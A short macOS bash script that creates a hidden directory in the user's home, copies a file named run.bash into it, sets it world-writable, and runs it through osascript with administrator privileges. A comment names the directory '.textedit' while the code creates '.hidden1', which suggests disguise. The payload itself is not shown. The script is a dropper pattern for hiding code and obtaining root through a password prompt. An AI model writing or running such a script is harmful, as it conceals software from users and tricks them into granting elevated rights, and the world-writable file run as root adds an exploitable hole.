#!/bin/bash

#if [[ $EUID -ne 0 ]]; then
#   echo "This script must be run as root" 
#   exit 1
#fi

#Create the hidden directory ~/.textedit
mkdir $HOME/.hidden1
cp run.bash $HOME/.hidden1/run.bash
chmod 777 $HOME/.hidden1/run.bash
osascript -e "do shell script \"$HOME/.hidden1/run.bash $*\" with administrator privileges"
